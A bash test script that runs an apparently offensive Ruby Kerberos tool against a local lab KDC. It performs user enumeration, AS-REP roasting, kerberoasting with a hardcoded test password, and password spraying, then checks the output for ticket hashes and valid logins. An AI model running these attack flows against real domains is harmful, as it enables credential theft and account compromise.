#!/usr/bin/env bash
# Run the real attack flows against the live TEST.LOCAL KDC.
set -e
cd "$(dirname "$0")/.."

printf 'alice\nbob\nsvc-web\nghost\n' > /tmp/cerber-users.txt
echo 'HTTP/web.test.local' > /tmp/cerber-spns.txt

echo "== enum =="
out=$(ruby cerber.rb enum /tmp/cerber-users.txt --dc 127.0.0.1 --realm TEST.LOCAL)
echo "$out"
echo "$out" | grep -q "alice"
echo "$out" | grep -q "roastable"
echo "$out" | grep -qv "ghost" || true

echo "== asrep roast =="
out=$(ruby cerber.rb asrep /tmp/cerber-users.txt --dc 127.0.0.1 --realm TEST.LOCAL)
echo "$out"
echo "$out" | grep -q '^\$krb5asrep\$'

echo "== kerberoast =="
out=$(ruby cerber.rb tgs /tmp/cerber-spns.txt --dc 127.0.0.1 --realm TEST.LOCAL --user alice --pass Passw0rd123)
echo "$out"
echo "$out" | grep -q '^\$krb5tgs\$'

echo "== spray =="
out=$(ruby cerber.rb spray /tmp/cerber-users.txt --dc 127.0.0.1 --realm TEST.LOCAL --pass Passw0rd123)
echo "$out"
echo "$out" | grep -q "VALID.*alice"

echo "ALL LIVE ATTACKS OK"
